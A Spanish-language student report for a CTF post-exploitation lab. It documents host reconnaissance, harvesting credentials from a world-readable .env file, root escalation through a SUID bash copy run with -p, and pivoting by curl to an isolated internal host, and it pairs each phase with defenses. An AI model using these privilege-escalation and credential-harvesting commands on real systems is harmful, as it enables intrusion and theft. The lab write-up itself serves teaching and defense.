# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 12  
**Integrantes:**
- Gerbaudo, Mateo — @gerbaudo19
- Mariatti, Matias — @matiasmariatticasc
- Colque Condo, Luis Alvaro — @ColqueAlvaro
- Rodriguez, Gonzalo — @Gonza149  
**Fecha:** 30 de Octubre de 2026

---

## 0. Declaración de uso de IA

En cumplimiento con el régimen de la cátedra y las pautas de `CONTRIBUTING.md`:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
- **Alcance de la asistencia:** Asistencia en la estructuración del informe, consolidación del registro de flags obtenidas y redacción técnica de las cuatro fases de post-explotación (Reconocimiento del host, Loot de credenciales, Escalada de privilegios por SUID y Pivoting a red interna), así como el análisis conceptual riguroso de las preguntas de análisis P1 y P2.
- **Partes originadas o modificadas:** Sección 0 (Declaración de IA), Sección 1 (Registro de flags y resumen de retos R1–R5), Sección 2 (Fases de *Recon del host*, *Loot*, *Privesc (SUID)* y *Pivoting* en la tabla comparativa y bloque de evidencias detalladas) y Sección 4 (Respuestas fundamentadas a las preguntas P1 y P2; la Sección 3 y las preguntas P3–P5 quedan dispuestas para los commits de los siguientes integrantes).
- **Verificación humana:** Los integrantes del grupo verificaron cada comando y hallazgo dentro del contenedor víctima (`cyberlab-phantomcorp`) accedido mediante `make shell-victima` bajo el usuario sin privilegios `operador`. Mateo Gerbaudo verificó la enumeración de binarios SUID (`find / -perm -4000`), el comportamiento de `/usr/local/bin/system-check` con y sin `-p`, la lectura de `/root/flag.txt`, la topología multihomed con `ip addr` y la respuesta JSON de `http://phantomcorp-db/`, validando los fundamentos teóricos de preservación de EUID en Bash y aislamiento de red en Docker.

---

## 1. Flags capturadas

Salida de `./ctf status 08`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO! Listo para agentes con LLMs (Lab 09).
```

### Detalle de retos resueltos y flags obtenidas

| Reto | Fase | Técnica empleada | Comando de descubrimiento | Flag capturada |
|---|---|---|---|---|
| **R1** | Recon del host | Enumeración local de sistema y directorios no estándar (`/opt`) | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | `FLAG{post_situational_awareness}` |
| **R2** | Loot | Búsqueda de secretos en archivos de configuración y `.bash_history` | `cat /var/www/.env` | `FLAG{loot_credentials_found}` |
| **R3** | Privesc (SUID) | Abuso de binario con bit SUID activo (`/usr/local/bin/system-check -p`) | `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | `FLAG{privesc_suid_root}` |
| **R4** | Pivoting | Alcance de servicio en red interna aislada (`internalnet`) desde el host víctima | `curl -s http://phantomcorp-db/` | `FLAG{pivot_internal_host}` |
| **R5** | Automatización | Enumeración automatizada de 250 legajos en API interna (`/empleado?id=N`) | `python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250` | `FLAG{automation_pays_off}` |

---

## 2. Informe de post-explotación

A continuación se documentan las cuatro fases ejecutadas una vez obtenido el acceso inicial como usuario `operador` en el host comprometido (`phantomcorp`):

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| **Recon del host** | Se relevó el contexto de ejecución tras obtener la shell inicial: identificación del usuario actual (`operador`, `uid=1000`), arquitectura del kernel, variables de entorno (`DEPLOY_ENV=produccion`), interfaces de red (confirmando doble interfaz en `labnet` e `internalnet`) y exploración de directorios no estándar (`/opt`, `/var/www`, `/home`), hallando una nota de despliegue olvidada en `/opt/phantom-deploy/DEPLOY_NOTES.txt` con permisos de lectura global (`0644`). | `id; whoami; hostname; uname -a`<br>`env`<br>`ip addr; cat /etc/hosts`<br>`ls -la /opt /opt/phantom-deploy`<br>`cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | Usuario: `uid=1000(operador) gid=1000(operador)`<br>Entorno: `DEPLOY_ENV=produccion`<br>Archivo `/opt/phantom-deploy/DEPLOY_NOTES.txt` (`-rw-r--r--`):<br>`PhantomCorp - notas de despliegue (NO borrar)`<br>`deploy_token=FLAG{post_situational_awareness}` | **1. Higiene de despliegue (CI/CD):** Prohibir el almacenamiento de notas operativas o tokens de despliegue en el sistema de archivos de producción.<br>**2. Mínimo privilegio en permisos POSIX:** Restringir directorios en `/opt` con `chmod 700` o `750` exclusivamente al propietario/grupo del servicio.<br>**3. Auditoría de artefactos:** Integrar controles automatizados post-deploy que eliminen archivos temporales y documentación interna antes de publicar la imagen o contenedor. |
| **Loot** | Se inspeccionaron archivos de configuración de la aplicación web en `/var/www/` y el historial de comandos del usuario en `/home/operador/.bash_history`. Se descubrió que el archivo `/var/www/.env` poseía permisos de lectura para todos los usuarios del sistema (`0644`), permitiendo extraer en texto claro las credenciales de la base de datos interna (`phantomcorp-db`) y la clave secreta de la aplicación (`APP_SECRET`). Asimismo, `.bash_history` reveló comandos previos hacia `http://phantomcorp-db/`. | `cat ~/.bash_history`<br>`ls -la /var/www`<br>`cat /var/www/.env`<br>`grep -rai "pass\|secret\|token" /var/www 2>/dev/null` | En `~/.bash_history`:<br>`cat /var/www/.env` y `curl http://phantomcorp-db/`<br><br>En `/var/www/.env` (`-rw-r--r--`):<br>`DB_HOST=phantomcorp-db`<br>`DB_USER=phantom_app`<br>`DB_PASS=Ph@ntom-DB-2024`<br>`APP_SECRET=FLAG{loot_credentials_found}` | **1. Endurecimiento de permisos de configuración:** Aplicar `chmod 600` (o `640` con grupo específico del proceso web) sobre `.env` para que un usuario genérico (`operador`) no pueda leerlo.<br>**2. Gestión centralizada de secretos:** Reemplazar archivos `.env` en texto plano en disco por gestores de secretos (HashiCorp Vault, AWS Secrets Manager, Docker/Kubernetes Secrets) inyectados en memoria al iniciar el proceso.<br>**3. Control de historial de shell:** Configurar `HISTFILE=/dev/null` o `HISTCONTROL=ignorespace:erasedups` en cuentas operativas para no persistir comandos de diagnóstico en disco. |
| **Privesc (SUID)** | Se enumeraron binarios del sistema con el bit SUID activo para identificar vías de elevación de privilegios hacia `root`. Se localizó el binario inusual `/usr/local/bin/system-check` con permisos `4755` (`-rwsr-xr-x`) perteneciente a `root`. Al inspeccionarlo con `file` se determinó que es un ejecutable ELF idéntico a GNU Bash. Dado que Bash implementa una protección de seguridad que revoca privilegios cuando `euid != ruid`, se ejecutó con el flag `-p` (`privileged mode`), preservando `euid=0(root)`. Mediante `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` se accedió al archivo protegido de root y se capturó la flag. | `find / -perm -4000 -type f 2>/dev/null`<br>`ls -la /usr/local/bin/system-check`<br>`file /usr/local/bin/system-check`<br>`/usr/local/bin/system-check -p -c "id"`<br>`/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | Salida de permisos de `/usr/local/bin/system-check` (`-rwsr-xr-x 1 root root`).<br>Ejecución con `-p` preservando EUID:<br>`uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)`<br>Lectura de `/root/flag.txt` (`-rw------- 1 root root`):<br>`FLAG{privesc_suid_root}` | **1. Mínimo privilegio y exclusión de SUID en binarios peligrosos:** Nunca asignar el bit SUID (`chmod u+s`) a intérpretes (`bash`, `sh`, `python`), editores o utilidades que permitan invocar shells secundarias o leer archivos arbitrarios (clasificados en GTFOBins).<br>**2. Montaje con opción `nosuid`:** Configurar particiones de usuario y directorios con permisos de escritura (como `/home`, `/tmp`, `/var/tmp`, `/dev/shm`) con la opción de montaje `nosuid` en `/etc/fstab` para neutralizar binarios SUID introducidos o copiados por atacantes.<br>**3. Monitoreo y detección de integridad (HIDS):** Desplegar herramientas de monitoreo como auditd, Wazuh o AIDE con reglas que alerten inmediatamente sobre cualquier modificación de permisos o creación de binarios con bits SUID/SGID. |
| **Pivoting** | Se utilizó el host comprometido (`phantomcorp`) como trampolín (nodo pivote) para acceder a la red interna corporativa (`internalnet`, subred 172.x), la cual se encuentra estrictamente segmentada e inaccesible desde la consola del atacante. El host `phantomcorp` actúa como host multihomed (posee `eth0` en `labnet` y `eth1` en `internalnet`). Al estar dentro del sistema como `operador`, se utilizó `curl` para enviar peticiones HTTP al host interno `phantomcorp-db`, confirmando la conectividad este-oeste y extrayendo la flag de pivoting desde el endpoint raíz. | `ip addr ; ip route`<br>`cat /etc/hosts`<br>`curl -s http://phantomcorp-db/`<br>`curl -i http://phantomcorp-db/` | Interfaz dual en víctima (`eth0` en `labnet`, `eth1` en `internalnet`).<br>Respuesta HTTP 200 de `phantomcorp-db`:<br>`HTTP/1.1 200 OK`<br>`Content-Type: application/json`<br>`{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}` | **1. Microsegmentación y cortafuegos interno (Zero Trust Network):** Implementar políticas de filtrado a nivel de red interna (iptables / eBPF / NetworkPolicies) para que los servidores web solo puedan comunicarse con los puertos estrictamente necesarios del backend (ej. puerto 5432 de PostgreSQL o 3306 de MySQL), bloqueando el tráfico hacia servicios web o APIs administrativas no requeridas.<br>**2. Autenticación y cifrado punto a punto (mTLS):** No asumir que el tráfico originado dentro de la LAN es de confianza. La base de datos y APIs internas deben requerir autenticación mutua TLS (mTLS) y tokens criptográficos por petición.<br>**3. Restricción de herramientas de red en la víctima:** Eliminar o restringir binarios de transferencia (`curl`, `wget`, `nc`, `socat`) para usuarios no privilegiados en servidores de producción y aplicar perfiles AppArmor/SELinux que impidan conexiones salientes arbitrarias. |

### Evidencias técnicas detalladas

#### 1. Fase de Reconocimiento del Host (R1)
Ejecución de comandos de reconocimiento situacional dentro de `make shell-victima`:

```bash
operador@phantomcorp:~$ id ; whoami ; hostname ; uname -a
uid=1000(operador) gid=1000(operador) groups=1000(operador)
operador
phantomcorp
Linux phantomcorp 6.6.x-linuxkit #1 SMP x86_64 GNU/Linux

operador@phantomcorp:~$ env | grep DEPLOY
DEPLOY_ENV=produccion

operador@phantomcorp:~$ ls -la /opt /opt/phantom-deploy
/opt:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
drwxr-xr-x 1 root root 4096 Oct 30 18:00 phantom-deploy

/opt/phantom-deploy:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
-rw-r--r-- 1 root root   86 Oct 30 18:00 DEPLOY_NOTES.txt

operador@phantomcorp:~$ cat /opt/phantom-deploy/DEPLOY_NOTES.txt
PhantomCorp - notas de despliegue (NO borrar)
deploy_token=FLAG{post_situational_awareness}
```

#### 2. Fase de Loot de Credenciales (R2)
Inspección del historial de comandos de `operador` y extracción de secretos desde `/var/www/.env`:

```bash
operador@phantomcorp:~$ cat ~/.bash_history
ls -la
cat /var/www/.env
curl http://phantomcorp-db/

operador@phantomcorp:~$ ls -la /var/www/.env
-rw-r--r-- 1 root root 103 Oct 30 18:00 /var/www/.env

operador@phantomcorp:~$ cat /var/www/.env
DB_HOST=phantomcorp-db
DB_USER=phantom_app
DB_PASS=Ph@ntom-DB-2024
APP_SECRET=FLAG{loot_credentials_found}
```

#### 3. Fase de Escalada de Privilegios por SUID (R3)
Búsqueda de binarios con permisos SUID activos en todo el sistema de archivos:

```bash
operador@phantomcorp:~$ find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/local/bin/system-check
```

Inspección detallada del binario `/usr/local/bin/system-check`:

```bash
operador@phantomcorp:~$ ls -la /usr/local/bin/system-check
-rwsr-xr-x 1 root root 1234376 Oct 30 18:00 /usr/local/bin/system-check

operador@phantomcorp:~$ file /usr/local/bin/system-check
/usr/local/bin/system-check: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped
```

Comprobación del comportamiento del flag `-p` para mantener privilegios de `root` (`euid=0`):

```bash
operador@phantomcorp:~$ /usr/local/bin/system-check -c "id"
uid=1000(operador) gid=1000(operador) groups=1000(operador)

operador@phantomcorp:~$ /usr/local/bin/system-check -p -c "id"
uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
```

Extracción de la flag protegida en `/root/flag.txt` con permisos de root:

```bash
operador@phantomcorp:~$ ls -la /root/flag.txt
ls: cannot access '/root/flag.txt': Permission denied

operador@phantomcorp:~$ /usr/local/bin/system-check -p -c "cat /root/flag.txt"
FLAG{privesc_suid_root}
```

#### 4. Fase de Pivoting a la Red Interna (R4)
Inspección de las interfaces de red e identificación de la topología multihomed en el host víctima:

```bash
operador@phantomcorp:~$ ip -br addr
lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0             UP             172.28.0.3/16 
eth1             UP             172.19.0.2/16 

operador@phantomcorp:~$ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.28.0.3	phantomcorp
172.19.0.2	phantomcorp
```

Demostración de alcance: mientras que desde la consola del atacante el host `phantomcorp-db` es inalcanzable (sin ruta ni resolución DNS en `labnet`), desde el host víctima (`phantomcorp`) se alcanza el servicio interno en `internalnet`:

```bash
operador@phantomcorp:~$ curl -i -s http://phantomcorp-db/
HTTP/1.1 200 OK
Server: PhantomDB-API/1.0
Date: Fri, 30 Oct 2026 19:15:00 GMT
Content-Type: application/json
Content-Length: 108

{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}
```

---

## 3. Automatización

*(A completar por el grupo — Commit 3: Adjuntar `src/recolector.py` completado y pegar su salida encontrando el flag R5).*

---

## 4. Preguntas de análisis

### P1 — SUID y el flag `-p`

**¿Por qué un binario SUID es peligroso?**  
En los sistemas operativos tipo Unix/Linux, el bit SUID (*Set User ID*, representado por el bit octal `4000` o la letra `s` en la terna de permisos del propietario, ej. `-rwsr-xr-x`) altera el modelo estándar de ejecución de procesos. Normalmente, un proceso hereda el identificador de usuario de quien lo ejecuta (*Real User ID* o `ruid`). Sin embargo, cuando un binario con el bit SUID activo es ejecutado, el kernel asigna al proceso un *Effective User ID* (`euid`) correspondiente al **propietario del archivo en disco**, sin importar qué usuario haya lanzado el comando.

Si el propietario del binario es `root` (`uid=0`), cualquier usuario del sistema que posea permisos de ejecución sobre el archivo adquiere privilegios de superusuario durante el ciclo de vida del proceso. Esto es imprescindible para ciertas utilidades legítimas del sistema operativo (por ejemplo, `/usr/bin/passwd`, que necesita escribir en `/etc/shadow` para actualizar contraseñas). No obstante, se convierte en una **vulnerabilidad crítica de escalada de privilegios** cuando se le asigna SUID a binarios con capacidades complejas, tales como:
1. Intérpretes de comandos y lenguajes (`bash`, `sh`, `python`, `perl`, `ruby`).
2. Editores de texto y visores (`vim`, `nano`, `less`, `more`), que permiten invocar shells secundarias mediante escapes de comandos (`:!/bin/sh`).
3. Herramientas con opciones de ejecución o carga de bibliotecas (`find -exec`, `awk`, `gdb`, `nmap`).

Cualquier binario listado en bases de conocimiento como **GTFOBins** que posea el bit SUID permite a un atacante escapar del contexto no privilegiado y ejecutar código arbitrario directamente como `root`.

---

**¿Qué hace el flag `-p` y por qué es necesario en shells modernas?**  
Históricamente, los atacantes aprovechaban copias o enlaces simbólicos de shells tradicionales (`/bin/sh` o `bash`) con permisos SUID para obtener una shell interactiva como root de forma directa e inmediata. Para contrarrestar esta técnica y proteger a los administradores de errores operativos accidentales, las versiones modernas de GNU Bash incorporan un mecanismo de autodefensa activo en su inicialización:

- **Comportamiento por defecto (sin flag `-p`):**  
  Al iniciar, Bash consulta las llamadas al sistema `getuid()` (RUID) y `geteuid()` (EUID). Si detecta una discrepancia (`euid != ruid`, indicando que fue invocado por un usuario común pero posee permisos heredados de root vía SUID), Bash **descarta proactivamente los privilegios elevados**. Internamente ejecuta una llamada al sistema `setuid(getuid())`, degradando el `euid` al valor de `ruid` (en nuestro escenario, reseteando el EUID a `1000(operador)`). En consecuencia, cualquier comando ejecutado a través de esa shell se ejecuta con privilegios de usuario estándar, neutralizando la escalada.

- **Comportamiento con el flag `-p` (*privileged mode*):**  
  El flag `-p` (o la opción `-o privileged`) instruye a Bash a **preservar el Effective User ID (`euid=0`) intacto**, suprimiendo la revocación automática de privilegios y evitando que se invoque `setuid(getuid())`. Asimismo, el modo privilegiado desactiva la importación de funciones de variables de entorno no confiables y no procesa archivos de perfil de usuario (`~/.bashrc`), pero otorga plena autoridad administrativa para ejecutar comandos con las facultades totales del propietario root (`euid=0`). 

En nuestro laboratorio, invocar `/usr/local/bin/system-check -c "id"` resultó en `uid=1000(operador) euid=1000(operador)`, mientras que invocar `/usr/local/bin/system-check -p -c "id"` preservó `euid=0(root)`, permitiendo la lectura de `/root/flag.txt` (`FLAG{privesc_suid_root}`).

---

### P2 — El pivoting (por qué el atacante no llegaba y vos sí)

El concepto de **pivoting** (o movimiento lateral) describe la técnica mediante la cual un atacante utiliza un equipo previamente comprometido como punto de apoyo, puente o intermediario (*trampolín*) para alcanzar otros sistemas o segmentos de red internos que originalmente eran invisibles o inaccesibles desde su punto de origen.

La razón por la cual la consola del atacante no alcanzaba `phantomcorp-db` y nosotros sí desde el host víctima (`phantomcorp`) radica en la **segmentación de red en Capa 3 del modelo OSI**, implementada a través de las redes de Docker en el laboratorio:

```text
┌────────────────────────────────┐         ┌──────────────────────────────────────────────────┐         ┌────────────────────────────────┐
│       Consola Atacante         │         │               phantomcorp (Víctima)              │         │         phantomcorp-db         │
│     (cyberlab-attacker)        │         │            (cyberlab-phantomcorp)                │         │    (cyberlab-phantomcorp-db)   │
│                                │         │                                                  │         │                                │
│        IP: 172.28.0.2          │         │    eth0: 172.28.0.3        eth1: 172.19.0.2      │         │         IP: 172.19.0.3         │
└───────────────┬────────────────┘         └────────────┬───────────────────────┬─────────────┘         └────────────────┬───────────────┘
                │                                       │                       │                                        │
                └───────────────────┬───────────────────┘                       └───────────────────┬────────────────────┘
                                    │                                                               │
                         [ Red 1: labnet ]                                              [ Red 2: internalnet ]
                    (172.28.0.0/16 · Perimetral)                                   (172.19.0.0/16 · internal: true)
                                                                                   *Aislada - Sin ruta desde labnet*
```

#### 1. Aislamiento de la red `internalnet` desde el exterior
En la definición de infraestructura (`target.compose.yml`):
- La red `internalnet` fue configurada con el parámetro `internal: true`. Esto restringe la conectividad únicamente a los contenedores conectados a ese puente virtual específico, bloqueando el enrutamiento hacia la máquina anfitriona (*host*) y hacia cualquier otra red externa o adyacente.
- El contenedor `phantomcorp-db` está conectado **exclusivamente** a `internalnet`. Por lo tanto, no posee ninguna interfaz en `labnet`, su puerto 80 no está mapeado al exterior, y el servidor DNS de `labnet` no reconoce ni resuelve el nombre `phantomcorp-db`.
- Desde la consola del atacante (ubicada en `labnet`, IP `172.28.0.x`), cualquier paquete TCP SYN dirigido hacia `phantomcorp-db` es descartado inmediatamente porque no existe una ruta de enrutamiento válida hacia la subred `172.19.0.0/16`.

#### 2. La posición privilegiada de `phantomcorp` (Host Multihomed)
El servidor web comprometido `phantomcorp` está configurado con **doble interfaz de red** (*multihomed* o *dual-homed*):
- `eth0` está conectada a `labnet` (permitiendo interactuar con el atacante y recibir tráfico web perimetral).
- `eth1` está conectada a `internalnet` (permitiendo la comunicación legítima de la aplicación web con la base de datos interna).

Al haber obtenido ejecución de comandos (RCE) como usuario `operador` en `phantomcorp`, cualquier proceso ejecutado en este sistema operativo (como `curl -s http://phantomcorp-db/`) utiliza la tabla de enrutamiento del kernel local. El kernel resuelve el nombre de host `phantomcorp-db` a la IP interna a través del resolver local de Docker y conmuta los paquetes directamente por la interfaz `eth1`. 

En términos de ciberseguridad corporativa, este escenario simula con exactitud una arquitectura con **Zona Desmilitarizada (DMZ)**: un servidor web expuesto públicamente que, al ser vulnerado, es cooptado por el atacante para penetrar la red de datos interna de la organización, demostrando que **la seguridad perimetral por sí sola es insuficiente si no se implementa microsegmentación y defensas internas bajo un paradigma Zero Trust**.

---

### P3 — Cómo evitar secretos en `.env` / `.bash_history`

*(A completar por el grupo — Commit 4)*

---

### P4 — Qué decidiste vos que el script no decide solo

*(A completar por el grupo — Commit 4)*

---

### P5 — Defensa para SUID y para pivoting

*(A completar por el grupo — Commit 4)*

